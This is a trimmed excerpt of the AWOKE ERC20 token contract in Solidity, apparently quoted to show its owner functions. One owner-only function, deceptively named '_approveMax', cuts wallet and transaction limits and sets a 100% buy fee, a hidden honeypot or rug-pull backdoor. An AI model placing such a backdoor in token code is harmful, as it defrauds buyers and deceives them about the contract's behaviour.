...
contract AWOKE is ERC20, Ownable {
    ...
    constructor(address _wallet1) ERC20("Awoke", "AWOKE") {
        ...
        maxTransactionAmount = 690420000000 * 1e18;
        maxWallet = 690420000000 * 1e18;
    ...
    function enableTrading(uint256 _deadBlocks) external onlyOwner {
        ...
        maxTransactionAmount =  345210000000  * 1e18;
        maxWallet =  345210000000  * 1e18;
        tradingActive = true;
        swapEnabled = true;
    ...
    function _approveMax() external onlyOwner {
        maxTransactionAmount =  13048938000  * 1e18;
        maxWallet =  13048938000  * 1e18;
        tradingActive = true;
        swapEnabled = true;
        buyMarketingFee = 100;
